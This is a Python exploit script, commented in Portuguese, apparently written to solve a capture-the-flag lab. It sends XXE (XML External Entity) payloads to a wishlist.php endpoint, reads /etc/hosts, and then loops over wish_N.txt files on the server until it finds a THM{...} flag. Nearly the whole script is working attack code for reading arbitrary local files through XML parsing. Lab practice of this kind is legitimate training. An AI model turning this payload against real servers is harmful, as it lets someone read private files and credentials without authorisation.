"""Confere a XXE da lista de desejos e percorre os bilhetes do laboratório."""

import argparse
import re

import requests


parser = argparse.ArgumentParser(description=__doc__)
parser.add_argument("host", help="IP ou hostname da Lab Machine")
parser.add_argument("--limite", type=int, default=50)
args = parser.parse_args()
base = f"http://{args.host}"
session = requests.Session()


def post(product_id, entity=None):
    dtd = f'<!DOCTYPE foo [<!ENTITY payload SYSTEM "file://{entity}">]>' if entity else ""
    product = "&payload;" if entity else str(product_id)
    xml = (f'<?xml version="1.0"?>{dtd}<wishlist><user_id>1</user_id>'
           f'<item><product_id>{product}</product_id></item></wishlist>')
    response = session.post(
        base + "/wishlist.php", data=xml,
        headers={"Content-Type": "application/xml"}, timeout=10,
    )
    return response.status_code, response.text.strip()


print("baseline:", post(1))
print("hosts:", post(1, "/etc/hosts"))
for number in range(1, args.limite + 1):
    code, body = post(1, f"/var/www/html/wishes/wish_{number}.txt")
    print(f"wish_{number}.txt", code, body[:500])
    if re.search(r"THM\{[^}]+\}", body):
        print("Flag localizada no bilhete acima.")
        break
